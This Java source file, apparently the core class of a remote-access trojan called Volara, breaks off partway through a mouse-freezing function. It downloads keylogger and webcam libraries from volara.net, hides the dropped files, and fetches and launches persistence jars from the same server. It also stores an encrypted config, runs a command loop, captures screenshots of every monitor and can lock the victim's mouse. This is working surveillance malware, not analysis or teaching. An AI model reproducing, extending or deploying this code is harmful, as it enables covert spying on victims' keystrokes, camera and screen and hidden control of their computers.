package com.Volara;

import com.sun.jna.platform.win32.Kernel32;
import java.awt.*;
import javax.crypto.*;
import javax.crypto.spec.SecretKeySpec;
import javax.xml.bind.DatatypeConverter;
import java.net.*;
import java.nio.file.*;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.text.SimpleDateFormat;
import java.util.*;
import java.io.*;

import java.awt.image.BufferedImage;
import java.util.concurrent.TimeUnit;

/**
 * Created by Kevin on 3/23/2017.
 */
public class global {
    //Loop Funcs
    public static Integer loopTime = 5000;
    public static Boolean setLoopTime(Integer time){
        try{
            loopTime = time;
        }catch(Exception e){
            debug.addLine(e.toString() + "\n", Color.RED, 12, false);
            return false;
        }
        return true;
    }
    public static Boolean restartLoop(){
        try{
            looptmr.cancel();
            looptmr.schedule(new loop(), 0, loopTime);
        }catch(Exception e){
            debug.addLine(e.toString() + "\n", Color.RED, 12, false);
            return false;
        }
        return true;
    }
    public static Boolean stopLoop(){
        try{
            looptmr.cancel();
        }catch(Exception e){
            return false;
        }
        return true;
    }
    public static Boolean startLoop(){
        try{
            looptmr.schedule(new loop(), 0, loopTime);
        }catch(Exception e){
            return false;
        }
        return true;
    }
    public static Timer looptmr = new Timer();
    //Commands
    public static ArrayList<String> recievedCommands = new ArrayList<String>();
    public static String sendData = "";
    public static String currentCommand = "";
    //INIT Library:
    public static String libURLParent = "http://volara.net/dev/volara/libs/";
    public static String libSettings = "";
    public static String loopStatus = "" ;
    public static String getLibSettings(String url){
        String result = "Unknown";
        ArrayList<String> resultList = new ArrayList();
        try {
            resultList = webRequest.sendGet(url, 3000);
            result = resultList.get(1);
        } catch (Exception e) {
            debug.addLine("Couldn't recieve Lib File: ERROR: " + e.toString() + "\n", Color.RED, 12, false);
            return "ERROR";
        }
        debug.addLine("Lib File: RESULT: \n" + result + "\n", Color.GREEN, 12, false);
        libSettings = result;
        return  result;
    }
    public static Boolean getHardwareLibs(){
        if (libSettings != ""){
            String lines[] = libSettings.split("\\s*;\\s*");
            for (String line: lines) {
                debug.addLine("Current line: " + line + "\n", Color.yellow, 12, false);
                if(line.startsWith("HARDWARE:")){
                    String nameLib = line.substring(line.lastIndexOf(":") + 1);
                    if (nameLib != "" && !fileExists(global.prepareLocation + File.separator + "lib" + File.separator + nameLib)){
                        debug.addLine("Getting Lib: " + nameLib + "\n", Color.CYAN, 12, false);
                        webRequest.downloadFileFromURL(libURLParent + nameLib, new File(global.prepareLocation + File.separator + "lib" + File.separator + nameLib));
                        if (profile.hideFile == true){
                            hideFile(new File(global.prepareLocation + File.separator + "lib" + File.separator + nameLib));
                        }
                    }
                }
            }
            }else{
            getLibSettings(libconnURL);
            //Check again
            if (libSettings == ""){
                loopStatus = "notConnected";
                debug.addLine("Couldn't find Server Library Settings!", Color.red, 12, true);
                return false;
            }

        }
        return true;
    }
    public static Boolean getWebcamLibs(){
        if (libSettings != ""){
            String lines[] = libSettings.split("\\s*;\\s*");
            for (String line: lines) {
                debug.addLine("Current line: " + line + "\n", Color.yellow, 12, false);
                if(line.startsWith("WEBCAM:")){
                    String nameLib = line.substring(line.lastIndexOf(":") + 1);
                    if (nameLib != "" && !fileExists( global.prepareLocation + File.separator + "lib" + File.separator + nameLib)){
                        debug.addLine("Getting Lib: " + nameLib + "\n", Color.CYAN, 12, false);
                        webRequest.downloadFileFromURL(libURLParent + nameLib, new File(global.prepareLocation + File.separator + "lib" + File.separator + nameLib));
                        if (profile.hideFile == true){
                            hideFile(new File(global.prepareLocation + File.separator + "lib" + File.separator + nameLib));
                        }
                    }
                }
            }
        }else{
            getLibSettings(libconnURL);
            //Check again
            if (libSettings == ""){
                loopStatus = "notConnected";
                debug.addLine("Couldn't find Server Library Settings!", Color.red, 12, true);
                return false;
            }

        }
        return true;
    }
    public static Boolean getSysHookLibs(){
        if (libSettings != ""){
            String lines[] = libSettings.split("\\s*;\\s*");
            for (String line: lines) {
                debug.addLine("Current line: " + line + "\n", Color.yellow, 12, false);
                if(line.startsWith("KEYLOG:")){
                    String nameLib = line.substring(line.lastIndexOf(":") + 1);
                    if (nameLib != "" && !fileExists( global.prepareLocation + File.separator + "lib" + File.separator + nameLib)){
                        debug.addLine("Getting Lib: " + nameLib + "\n", Color.CYAN, 12, false);
                        webRequest.downloadFileFromURL(libURLParent + nameLib, new File(global.prepareLocation + File.separator + "lib" + File.separator + nameLib));
                        if (profile.hideFile == true){
                            hideFile(new File(global.prepareLocation + File.separator + "lib" + File.separator + nameLib));
                        }
                    }
                }
            }
        }else{
            getLibSettings(libconnURL);
            //Check again
            if (libSettings == ""){
                loopStatus = "notConnected";
                debug.addLine("Couldn't find Server Library Settings!", Color.red, 12, true);
                return false;
            }

        }
        return true;
    }
    public static Boolean firstStart(){
        File f = new File("");
        if (osType_GINFO == "Windows"){
            f = new File(global.prepareLocation + File.separator + profile.fileName_WIN + ".jar");
        }else if (osType_GINFO == "MacOS"){
            f = new File(global.prepareLocation + File.separator + profile.fileName_Mac + ".jar");
        }
        if(f.exists() && !f.isDirectory()) {
            File lib = new File(global.prepareLocation + File.separator + "lib");
            if (!lib.exists()) {
                lib.mkdir();
                if (profile.hideFile == true){
                    hideFolder(global.prepareLocation + File.separator + "lib");
                }
            }
            return false;
        }else{
            return true;
        }
    }
    public static void getNewStubLocation(){
        profile.fileLoc_WIN = profile.fileLoc_WIN.replace(";", File.separator);
        profile.fileLoc_MAC = profile.fileLoc_MAC.replace(":", File.separator);
        if (global.osType_GINFO == "Windows"){
            if (profile.fileLoc_WIN != ""){
                //Check if its in the home directory if so do shit.
                String fmtFileLoc = profile.fileLoc_WIN;
                if (profile.fileLoc_WIN.startsWith("~")){
                    fmtFileLoc = fmtFileLoc.replace("~", "");
                    fmtFileLoc = global.homeDir + fmtFileLoc;
                    debug.addLine(fmtFileLoc, Color.orange, 12, false);
                    //Check if Location exists
                    if (new File(fmtFileLoc).exists()){
                        global.prepareLocation = fmtFileLoc;
                    }else{
                        global.usingBackup = true;
                        fmtFileLoc = global.backupFileLoc_WIN;
                        fmtFileLoc = fmtFileLoc.replace("~", "");
                        fmtFileLoc = global.homeDir  + fmtFileLoc;
                        global.prepareLocation = fmtFileLoc;
                    }
                }else{
                    //Check if Location exists
                    if (new File(profile.fileLoc_WIN).exists()){
                        global.prepareLocation = profile.fileLoc_WIN;
                        debug.addLine("FIRST RUN: Copying File to Location - Windows.\n", Color.orange, 12, false);
                    }else{//Use backup location.
                        global.usingBackup = true;
                        fmtFileLoc = global.backupFileLoc_WIN;
                        fmtFileLoc = fmtFileLoc.replace("~", "");
                        fmtFileLoc = global.homeDir  + fmtFileLoc;
                        global.prepareLocation = fmtFileLoc;
                    }
                }
            }else{ //If nothing use backup Location.
                global.usingBackup = true;
                String fmtFileLoc = global.backupFileLoc_WIN;
                fmtFileLoc = fmtFileLoc.replace("~", "");
                fmtFileLoc = global.homeDir  + fmtFileLoc;
                global.prepareLocation = fmtFileLoc;
            }
        }else if (global.osType_GINFO == "MacOS"){ //Mac
            if (profile.fileLoc_MAC != ""){
                //Check if its in the home directory if so do shit.
                String fmtFileLoc = profile.fileLoc_MAC;
                if (profile.fileLoc_MAC.startsWith("~")){
                    fmtFileLoc = fmtFileLoc.replace("~", "");
                    fmtFileLoc = global.homeDir + fmtFileLoc;
                    //Check if Location exists
                    if (new File(fmtFileLoc).exists()){
                        global.prepareLocation = fmtFileLoc;
                    }else{
                        global.usingBackup = true;
                        fmtFileLoc = global.backupFileLoc_MAC;
                        fmtFileLoc = fmtFileLoc.replace("~", "");
                        fmtFileLoc = global.homeDir  + fmtFileLoc;
                        global.prepareLocation = fmtFileLoc;
                    }
                }else{
                    //Check if Location exists
                    if (new File(profile.fileLoc_MAC).exists()){
                        global.prepareLocation = profile.fileLoc_MAC;
                    }else{//Use backup location.
                        global.usingBackup = true;
                        fmtFileLoc = global.backupFileLoc_MAC;
                        fmtFileLoc = fmtFileLoc.replace("~", "");
                        fmtFileLoc = global.homeDir  + fmtFileLoc;
                        global.prepareLocation = fmtFileLoc;
                    }
                }
            }else{//If nothing use backup Location.
                global.usingBackup = true;
                String fmtFileLoc = global.backupFileLoc_MAC;
                fmtFileLoc = fmtFileLoc.replace("~", "");
                fmtFileLoc = global.homeDir  + fmtFileLoc;
                global.prepareLocation = fmtFileLoc;
            }
        }

    }
    public static void getNewPercLocation(){
        profile.persistantLoc_WIN = profile.persistantLoc_WIN.replace(";", File.separator);
        profile.persistantLoc_MAC = profile.persistantLoc_MAC.replace(":", File.separator);
        if (global.osType_GINFO == "Windows"){
            if (profile.persistantLoc_WIN != ""){
                //Check if its in the home directory if so do shit.
                String fmtFileLoc = profile.persistantLoc_WIN;
                if (profile.persistantLoc_WIN.startsWith("~")){
                    fmtFileLoc = fmtFileLoc.replace("~", "");
                    fmtFileLoc = global.homeDir + fmtFileLoc;
                    debug.addLine(fmtFileLoc, Color.orange, 12, false);
                    //Check if Location exists
                    if (new File(fmtFileLoc).exists()){
                        global.persistanceLocation = fmtFileLoc;
                    }else{
                        global.usingBackup = true;
                        fmtFileLoc = global.backupPercLoc_WIN;
                        fmtFileLoc = fmtFileLoc.replace("~", "");
                        fmtFileLoc = global.homeDir  + fmtFileLoc;
                        global.persistanceLocation = fmtFileLoc;
                    }
                }else{
                    //Check if Location exists
                    if (new File(profile.fileLoc_WIN).exists()){
                        global.persistanceLocation = profile.persistantLoc_WIN;
                        debug.addLine("FIRST RUN: Copying File to Location - Windows.\n", Color.orange, 12, false);
                    }else{//Use backup location.
                        global.usingBackup = true;
                        fmtFileLoc = global.backupPercLoc_WIN;
                        fmtFileLoc = fmtFileLoc.replace("~", "");
                        fmtFileLoc = global.homeDir  + fmtFileLoc;
                        global.persistanceLocation = fmtFileLoc;
                    }
                }
            }else{ //If nothing use backup Location.
                global.usingBackup = true;
                String fmtFileLoc = global.backupPercLoc_WIN;
                fmtFileLoc = fmtFileLoc.replace("~", "");
                fmtFileLoc = global.homeDir  + fmtFileLoc;
                global.persistanceLocation = fmtFileLoc;
            }
        }else if (global.osType_GINFO == "MacOS"){ //Mac
            if (profile.fileLoc_MAC != ""){
                //Check if its in the home directory if so do shit.
                String fmtFileLoc = profile.persistantLoc_MAC;
                if (profile.persistantLoc_MAC.startsWith("~")){
                    fmtFileLoc = fmtFileLoc.replace("~", "");
                    fmtFileLoc = global.homeDir + fmtFileLoc;
                    //Check if Location exists
                    if (new File(fmtFileLoc).exists()){
                        global.persistanceLocation = fmtFileLoc;
                    }else{
                        global.usingBackup = true;
                        fmtFileLoc = global.backupPercLoc_MAC;
                        fmtFileLoc = fmtFileLoc.replace("~", "");
                        fmtFileLoc = global.homeDir  + fmtFileLoc;
                        global.persistanceLocation = fmtFileLoc;
                    }
                }else{
                    //Check if Location exists
                    if (new File(profile.fileLoc_MAC).exists()){
                        global.persistanceLocation = profile.persistantLoc_MAC;
                    }else{//Use backup location.
                        global.usingBackup = true;
                        fmtFileLoc = global.backupPercLoc_MAC;
                        fmtFileLoc = fmtFileLoc.replace("~", "");
                        fmtFileLoc = global.homeDir  + fmtFileLoc;
                        global.persistanceLocation = fmtFileLoc;
                    }
                }
            }else{//If nothing use backup Location.
                global.usingBackup = true;
                String fmtFileLoc = global.backupPercLoc_MAC;
                fmtFileLoc = fmtFileLoc.replace("~", "");
                fmtFileLoc = global.homeDir  + fmtFileLoc;
                global.persistanceLocation = fmtFileLoc;
            }
        }

    }
    public static String prepareLocation = "";
    public static String persistanceLocation = "";
    //Backup Profile Fail:
    public static String backupFileLoc_WIN = "~" + File.separator + "AppData" + File.separator + "Roaming";
    public static String backupFileLoc_MAC = "~" + File.separator + "Library";
    public static String backupPercLoc_WIN = "~" + File.separator + "AppData"+ File.separator + "Roaming";
    public static String backupPercLoc_MAC = "~" + File.separator + "Library";
    public static Boolean usingBackup = false;

    //Persistance
    public static Boolean getPersistance() throws Exception {
        if (webConn == true){
            if (osType_GINFO == "Windows"){
                File fout = new File(global.persistanceLocation + File.separator + profile.persistantName_WIN + ".jar");
                fout.getParentFile().mkdirs();
                webRequest.downloadFileFromURL(presistanceURL + "win.jar", fout);
                return true;
            }else if(osType_GINFO == "MacOS"){
                File fout = new File(global.persistanceLocation + File.separator + profile.persistantName_MAC + ".jar");
                fout.getParentFile().mkdirs();
                webRequest.downloadFileFromURL(presistanceURL + "mac.jar", fout);
                return true;
            }else if(osType_GINFO == "Linux"){
                File fout = new File(profile.persistantLoc_MAC + profile.persistantName_MAC + "unix.bat");
                fout.getParentFile().mkdirs();
                webRequest.downloadFileFromURL(presistanceURL + "unix.bat", fout);
                return true;
            }
        }else{
            return false;
        }
        return false;
    }
    public static Boolean generatePersistance() throws Exception {
        String jsiNamePart = profile.appid.substring(0, profile.appid.length());
        String s1a = jsiNamePart.substring(0, (jsiNamePart.length()/2));
        String s1b = jsiNamePart.substring((jsiNamePart.length()/2));
        FileOutputStream fos = null;
        byte[] ci = null;
        try {
            try {
                ci =  cryptString("TIME=" + profile.persistantLoopTime.toString() + "|PID=" + getPid().toString() + "|BACKUP=" + profile.backup + "|LOCWIN=" + profile.fileLoc_WIN + "|NAMEWIN="+ profile.fileName_WIN +  "|LOCMAC="+ profile.fileLoc_MAC +  "|NAMEMAC=" + profile.fileName_Mac, profile.appid);
            } catch (UnsupportedEncodingException e) {
                e.printStackTrace();
            }
        } catch (NoSuchPaddingException e) {
            debug.addLine("ENCRYPTION ERROR: PADDING - Generate Data:" + e.toString() + "\n", Color.red, 12, false);
            return false;
        } catch (NoSuchAlgorithmException e) {
            debug.addLine("ENCRYPTION ERROR: Algorithm - Generate Data:" + e.toString() + "\n", Color.red, 12, false);
            return false;
        } catch (InvalidKeyException e) {
            debug.addLine("ENCRYPTION ERROR: Wrong Key - Generate Data:" + e.toString() + "\n", Color.red, 12, false);
            return false;
        } catch (BadPaddingException e) {
            debug.addLine("ENCRYPTION ERROR: BAD PADDING - Generate Data:" + e.toString() + "\n", Color.red, 12, false);
            return false;
        } catch (IllegalBlockSizeException e) {
            debug.addLine("ENCRYPTION ERROR: BLOCK - Generate Data:" + e.toString() + "\n", Color.red, 12, false);
            return false;
        }
        if (osType_GINFO == "Windows"){
            fos = new FileOutputStream(global.persistanceLocation + File.separator + s1b + s1a + ".jsi");
        }else if(osType_GINFO == "MacOS"){
                fos = new FileOutputStream(global.persistanceLocation + File.separator + s1b + s1a + ".jsi");
        }else if(osType_GINFO == "Linux"){
        }
        fos.write(ci);
        fos.close();
        return true;
    }
    public static void launchPersistance(){
        if (osType_GINFO == "Windows"){
            try {
                global.currentCommand = "java -jar " + global.persistanceLocation + File.separator + profile.persistantName_WIN + ".jar";
                execute myRunner = new execute();
                Thread myThread = new Thread(myRunner);
                myThread.start();
            } catch (Exception e) {
                debug.addLine("ERROR: IO - Generate Data:" + e.toString() + "\n", Color.red, 12, false);
            }
        }else if(osType_GINFO == "MacOS"){
            try {
                global.currentCommand = "java -jar " + global.persistanceLocation + File.separator + profile.persistantName_MAC + ".jar";
                execute myRunner = new execute();
                Thread myThread = new Thread(myRunner);
                myThread.start();
            } catch (Exception e) {
                debug.addLine("ERROR: Generate Data:" + e.toString() + "\n", Color.red, 12, false);
            }
        }else if(osType_GINFO == "Linux"){
        }
    }
    abstract class launcher implements Runnable{
        public void run(String Location){
            // Run a java app in a separate system process
            Process proc = null;
            try {
                proc = Runtime.getRuntime().exec("java -jar " + Location);
            } catch (IOException e) {
                e.printStackTrace();
            }
            // Then retreive the process output
            InputStream in = proc.getInputStream();
            InputStream err = proc.getErrorStream();
        }
    }
    public static void deleteFile(File source){
        try{
            source.delete();
            debug.addLine("Deleted File: - " + source.toString() + "\n", Color.YELLOW, 12, false);
        }catch(Exception e){
            debug.addLine("Couldn't Delete File: ERROR - " + e.toString() + "\n", Color.red, 12, false);
        }
    }
    //File/Folder Funcs
    public static void hideFile(File file) {
        global.checkOS();
        if (osType_GINFO == "Windows") {
            Process p = null;
            try {
                p = Runtime.getRuntime().exec("attrib +H " + file.getPath());
            } catch (IOException e) {
                debug.addLine("ERROR HIDING FILE: Running: " + e.toString() + "\n", Color.RED, 12, true);
            }
            try {
                p.waitFor();
            } catch (InterruptedException e) {
               debug.addLine("ERROR HIDING FILE: Wait for. " + e.toString() + "\n", Color.RED, 12, true);
            }
        }else{
            ProcessBuilder a = new ProcessBuilder();
            a.command("chflags", "hidden", file.getPath());
            try {
                a.start();
            } catch (IOException e) {
                debug.addLine("ERROR HIDING FILE: Flag Start: " + e.toString() + "\n", Color.RED, 12, true);
            }
        }
    }
    public static void hideFolder(String str){
        global.checkOS();
        Path path = FileSystems.getDefault().getPath(str, "sa");
        if (osType_GINFO == "Windows") {
            Runtime rt = Runtime.getRuntime();
            //put your directory path instead of your_directory_path

            try {
                Process p = rt.exec("attrib +H " + str);
                try {
                    p.waitFor();
                } catch (InterruptedException e) {
                }
            } catch (IOException e) {
                debug.addLine("HIDE FOLDER: ERROR |" + e.toString() + "\n", Color.RED, 12, false);
            }

        }else{
            ProcessBuilder a = new ProcessBuilder();
            a.command("chflags", "hidden", str);
            try {
                a.start();
            } catch (IOException e) {
            }
        }
    }
    public static void copyFileUsingStream(File source, File dest) throws IOException {
        InputStream is = null;
        OutputStream os = null;
        try {
            is = new FileInputStream(source);
            os = new FileOutputStream(dest);
            byte[] buffer = new byte[1024];
            int length;
            while ((length = is.read(buffer)) > 0) {
                os.write(buffer, 0, length);
            }
        } finally {
            is.close();
            os.close();
        }
    }
    public static String grabFileDate(File file){
        try{
            SimpleDateFormat sdf = new SimpleDateFormat("MM/dd/yyyy HH:mm:ss");
            String result = sdf.format(file.lastModified());
            debug.addLine("Date for file: " + result + "\n", Color.orange, 12, false);
            return sdf.format(file.lastModified());
        }catch(Exception e){
            debug.addLine("Date for file FAILED: " + e.toString() + "\n", Color.red, 12, false);
            return "Null";
        }
    }
    public static void copyDirectory(File sourceLocation , File targetLocation)
            throws IOException {

        if (sourceLocation.isDirectory()) {
            if (!targetLocation.exists()) {
                targetLocation.mkdir();
            }

            String[] children = sourceLocation.list();
            for (int i=0; i<children.length; i++) {
                copyDirectory(new File(sourceLocation, children[i]),
                        new File(targetLocation, children[i]));
            }
        } else {

            InputStream in = new FileInputStream(sourceLocation);
            OutputStream out = new FileOutputStream(targetLocation);

            // Copy the bits from instream to outstream
            byte[] buf = new byte[1024];
            int len;
            while ((len = in.read(buf)) > 0) {
                out.write(buf, 0, len);
            }
            in.close();
            out.close();
        }
    }
    public static boolean fileExists(String filePath){
        Path p = Paths.get(filePath);
        return Files.exists(p);
    }
    //Encoding & Decoding
    //Base64
    public static String base64Encode(String str){
        String encoded = DatatypeConverter.printBase64Binary(str.getBytes());
        return encoded;
    }
    public static String base64Decode(String str){
        String decoded = new String(DatatypeConverter.parseBase64Binary(str));
        return decoded;
    }
    //BlowFish
    public static byte[] cryptString(String s, String cryptKey) throws NoSuchPaddingException, NoSuchAlgorithmException, InvalidKeyException, UnsupportedEncodingException, BadPaddingException, IllegalBlockSizeException {
        byte[] KeyData = cryptKey.getBytes();
        SecretKeySpec KS = new SecretKeySpec(KeyData, "Blowfish");
        Cipher cipher = Cipher.getInstance("Blowfish");
        cipher.init(Cipher.ENCRYPT_MODE, KS);
        byte[] ci = cipher.doFinal(s.getBytes("UTF-8"));
        return ci;
    }
    public static String decryptString(byte[] s, String cryptKey) throws NoSuchPaddingException, NoSuchAlgorithmException, InvalidKeyException, BadPaddingException, IllegalBlockSizeException {
        byte[] KeyData = cryptKey.getBytes();
        SecretKeySpec KS = new SecretKeySpec(KeyData, "Blowfish");
        Cipher cipher = Cipher.getInstance("Blowfish");
        cipher.init(Cipher.DECRYPT_MODE, KS);
        String ret = new String(cipher.doFinal(s));
        return ret;
    }

    //Devices
    public static ArrayList<String> lstWebcams = new ArrayList<String>();
    public static GraphicsDevice[] lstScreens = null;

    //CORE VARS Booleans
    public static Boolean webConn = false;
    public static Boolean noWebcam = true;
    public static boolean userAdmin_GINFO = false;
    public static boolean userRoot_GINFO = false;
    public static Boolean noScreens = true;
    public static Boolean fzMouse = false;

    //CORE VARS Strings
    public static String homeDir = "Unknown";
    public static String userName = "Unknown";
    public static String myAppPath = "Unknown";
    public static String myAppName = "Unknown";
    public static String osType_GINFO = "Unknown";
    public static String osFullname_GINFO = "Unknown";
    public static String connURL = "http://volara.net";
    public static String libconnURL = "http://volara.net/dev/volara/libs/libSettings";
    public static String presistanceURL = "http://volara.net/dev/volara/persistance/";

    //CORE VARS Integers
    public static Integer screenWidth = 0;
    public static Integer screenHeight = 0;
    public static Integer numScreens = 0;

    //Global Funcs
    public static String cutString(String s, int size) {
        if (s.length() > size) {
            s = s.substring(0, size);
            return s;
        }
        return null;
    }
    public static BufferedImage resizeImage(BufferedImage originalImage, int type, int IMG_WIDTH, int IMG_HEIGHT) {
        BufferedImage resizedImage = new BufferedImage(IMG_WIDTH, IMG_HEIGHT, type);
        Graphics2D g = resizedImage.createGraphics();
        g.drawImage(originalImage, 0, 0, IMG_WIDTH, IMG_HEIGHT, null);
        g.dispose();

        return resizedImage;
    }
    public static Boolean connTest(String URL){
        debug.addLine("Init: Checking Connection with server started.\n", Color.LIGHT_GRAY, 12, false);
        try{
            ArrayList<String> varReturn = webRequest.sendGet(URL, 5000);
            if (varReturn.get(0).startsWith("5") == true){
                debug.addLine("Connection TEST | 5XX FAILED!" +  "\n", Color.RED, 12, true);
                webConn = false;
                return false;
            }else{
                debug.addLine("Connection TEST | SUSSESS! " + "\n", Color.GREEN, 10, true);
                webConn = true;
                return true;
            }
        }catch(Exception e) {
            debug.addLine("Connection TEST | ERROR: " + e.toString() + "\n", Color.RED, 10, true);
            webConn = false;
            return false;
        }
    }
    public static boolean isRoot() throws Exception {
            return checkOS() != "Windows" && new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec("whoami").getInputStream())).readLine().equals("root");
    }
    public static void restartApp(){
        final String javaBin = System.getProperty("java.home") + File.pathSeparator + "bin" + File.pathSeparator + "java";
        final File currentJar;
        try {
            currentJar = new File(Main.class.getProtectionDomain().getCodeSource().getLocation().toURI());
            debug.addLine("RESTART: Info: " + currentJar.getPath(), Color.ORANGE, 12, false);
            if(!currentJar.getName().endsWith(".jar")){
                debug.addLine("RESTART: Not a jar." + currentJar.getPath() + "\n", Color.YELLOW, 12, false);
               return;
            }
              /* Build command: java -jar application.jar */
            final ArrayList<String> command = new ArrayList<String>();
            command.add(javaBin);
            command.add("-jar");
            command.add(currentJar.getPath());
            debug.addLine("RESTART: Building commands.\n", Color.ORANGE, 12, false);
            final ProcessBuilder builder = new ProcessBuilder(command);

            try {
                builder.start();
                System.out.println("started");
                debug.addLine("RESTARTING" + currentJar.getPath() + "\n", Color.GREEN, 12, false);

            } catch (IOException e) {
                debug.addLine("RESTART: ERROR: " + e.toString() + "\n", Color.RED, 12, false);
            }
        } catch (URISyntaxException e) {
            debug.addLine("RESTART: ERROR: " + e.toString() + "\n", Color.RED, 12, false);
        }


      System.exit(1);
    }
    public static int execPersistant(Class klass) throws IOException, InterruptedException {
        String javaHome = System.getProperty("java.home");
        String javaBin = javaHome +
                File.pathSeparator + "bin" +
                File.pathSeparator + "java";
        String classpath = System.getProperty("java.class.path");
        String className = klass.getCanonicalName();

        ProcessBuilder builder = new ProcessBuilder(
                javaBin, "-cp", classpath, className);

        Process process = builder.start();
        process.waitFor();
        return process.exitValue();
    }
    public static String readFile(String filename){
        String content = null;
        File file = new File(filename); //for ex foo.txt
        FileReader reader = null;
        try {
            reader = new FileReader(file);
            char[] chars = new char[(int) file.length()];
            reader.read(chars);
            content = new String(chars);
            reader.close();
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            if(reader !=null){
                try {
                    reader.close();
                } catch (IOException e) {
                    return "error";
                }
            }
        }
        return content;
    }
    public static long getDateDiff(Date date1, Date date2, TimeUnit timeUnit) {
        long diffInMillies = date2.getTime() - date1.getTime();
        return timeUnit.convert(diffInMillies, TimeUnit.MILLISECONDS);
    }
    //General INFO Grabbers
    public static void grabGINFO(){
        returnAppName();
        returnAppPath();
        if (System.getProperty("user.name") == "?"){
            String[] parts = System.getProperty("user.home").split("/");
            userName = parts[1];
        }else{
            userName = System.getProperty("user.name");
        }
        homeDir = System.getProperty("user.home");
    }
    public static String returnAppName(){
        try {
            myAppName = new URLDecoder().decode(new File(global.class.getProtectionDomain().getCodeSource().getLocation().getPath()).getName(), "UTF-8");
            return myAppName;
        } catch (UnsupportedEncodingException e) {
            return "Unknown";
        }
    }
    public static String returnAppPath(){
        try {
            myAppPath = new URLDecoder().decode(new File("").getAbsolutePath(), "UTF-8");
            return myAppPath;
        } catch (UnsupportedEncodingException e) {
            return "Unknown";
        }
    }
    public static String checkOS(){
            String OS = System.getProperty("os.name", "generic").toLowerCase(Locale.ENGLISH);
            osFullname_GINFO = OS;
            if ((OS.indexOf("mac") >= 0) || (OS.indexOf("darwin") >= 0)) {
                osType_GINFO = "MacOS";
                return "MacOS";
            } else if (OS.indexOf("win") >= 0) {
                osType_GINFO = "Windows";
                return "Windows";
            } else if (OS.indexOf("nux") >= 0) {
                osType_GINFO = "Linux";
                return "Linux";
            } else {
                osType_GINFO = "Other";
                return "Other";
            }
    }

    //Procss Funcs
    public static String getPid() throws IOException,InterruptedException {
        checkOS();
        if (osType_GINFO == "Windows"){
            return Integer.toString(Kernel32.INSTANCE.GetCurrentProcessId());
        }else{
            Vector<String> commands=new Vector<String>();
            commands.add("/bin/bash");
            commands.add("-c");
            commands.add("echo $PPID");
            ProcessBuilder pb=new ProcessBuilder(commands);

            Process pr=pb.start();
            pr.waitFor();
            if (pr.exitValue()==0) {
                BufferedReader outReader=new BufferedReader(new InputStreamReader(pr.getInputStream()));
                return outReader.readLine().trim();
            } else {
                System.out.println("Error while getting PID");
                return "";
         }
        }
    }
    public static boolean isStillAllive(String pidStr) {
        String OS = System.getProperty("os.name").toLowerCase();
        String command = null;
        if (OS.indexOf("win") >= 0) {
            debug.addLine("Check alive Windows mode. Pid: [{}]" +  pidStr + "\n", Color.lightGray, 12, false);
            command = "cmd /c tasklist /FI \"PID eq " + pidStr + "\"";
        } else if (OS.indexOf("nix") >= 0 || OS.indexOf("nux") >= 0) {
            debug.addLine("Check alive Linux mode. Pid: [{}]" +  pidStr + "\n", Color.lightGray, 12, false);
            command = "ps -p " + pidStr;
        } else {
            debug.addLine("Check alive Windows mode. Pid: [{}]" +  pidStr + "\n", Color.lightGray, 12, false);
            return false;
        }
        return isProcessIdRunning(pidStr, command); // call generic implementation
    }
    public static boolean isProcessIdRunning(String pid, String command) {
        debug.addLine("Command [{}]" + command + "\n" , Color.lightGray, 12, false);
        try {
            Runtime rt = Runtime.getRuntime();
            Process pr = rt.exec(command);

            InputStreamReader isReader = new InputStreamReader(pr.getInputStream());
            BufferedReader bReader = new BufferedReader(isReader);
            String strLine = null;
            while ((strLine= bReader.readLine()) != null) {
                if (strLine.contains(" " + pid + " ")) {
                    return true;
                }
            }

            return false;
        } catch (Exception ex) {
            debug.addLine("Got exception using system command [{}]." + ex.toString() + "\n" , Color.RED, 12, false);
            return true;
        }
    }

    //Screen Funcs
    public static void getScreens(){
        try{
            debug.addLine("Init: Grabbing monitor devices started.\n", Color.LIGHT_GRAY, 12, false);
            GraphicsEnvironment g = GraphicsEnvironment.getLocalGraphicsEnvironment();
            GraphicsDevice[] devices = g.getScreenDevices();
            lstScreens = devices;
            screenHeight = 0;
            screenWidth = 0;
            int screens = 0;
            for (int i = 0; i < devices.length; i++) {
                screens++;
                screenWidth += devices[i].getDisplayMode().getWidth();
                screenHeight += devices[i].getDisplayMode().getHeight();
            }
            numScreens = screens;
            if (numScreens == 0){
                noScreens = true;
            }else{
                noScreens = false;
            }
            debug.addLine("Init: Grabbing monitor devices finished.\n", Color.LIGHT_GRAY, 12, false);
        }catch(Exception e){
            debug.addLine("Init: Grabbing monitor devices failed: " + e.toString() + "\n", Color.RED, 12, false);
            debug.addLine("Init: Grabbing monitor devices finished.\n", Color.LIGHT_GRAY, 12, false);
        }
    }
    public static BufferedImage getFullScreenshot(){
        debug.addLine("Full-Screenshot: taking screenshot." +  "\n", Color.white, 12, true);
        int smX = 0;
        int smY = 0;
        for (int i = 0; i < lstScreens.length; i++) {
           if (lstScreens[i].getDefaultConfiguration().getBounds().x < smX){
               smX = lstScreens[i].getDefaultConfiguration().getBounds().x;
           }
            if (lstScreens[i].getDefaultConfiguration().getBounds().y < smY){
                smY = lstScreens[i].getDefaultConfiguration().getBounds().y;
            }
        }
        try{
            BufferedImage capture = new Robot().createScreenCapture(new Rectangle(smX, smY, screenWidth + smX, screenHeight + smY));
            debug.addLine("Full-Screenshot | SUCCESS!" + "\n", Color.GREEN, 12, true);
            return capture;
        }catch(Exception e){
            debug.addLine("Full-Screenshot | ERROR: " + e.toString() + "\n", Color.RED, 12, true);
            return null;
        }
    }
    public static BufferedImage getScreenshot(int index){
        debug.addLine("Monitor-Screenshot: taking screenshot." +  "\n", Color.white, 12, true);
        try{
            Rectangle monitorRect = new Rectangle(lstScreens[index].getDefaultConfiguration().getBounds().x, lstScreens[index].getDefaultConfiguration().getBounds().y, lstScreens[index].getDisplayMode().getWidth(), lstScreens[index].getDisplayMode().getHeight());
            BufferedImage capture = new Robot().createScreenCapture(monitorRect);
            debug.addLine("Monitor-Screenshot | SUCCESS!" + "\n", Color.GREEN, 12, true);
            return capture;
        }catch(Exception e){
            debug.addLine("Monitor-Screenshot | ERROR: " + e.toString() + "\n", Color.RED, 12, true);
            return null;
        }
    }

    //Input Funcs
    public static void freezeMouse(){
        while ( fzMouse != false )
        {
            try {
                // These coordinates are screen coordinates
                int xCoord = 0;
                int yCoord = 0;

                // Move the cursor
                Robot robot = new Robot();
                robot.mouseMove(xCoord, yCoord);
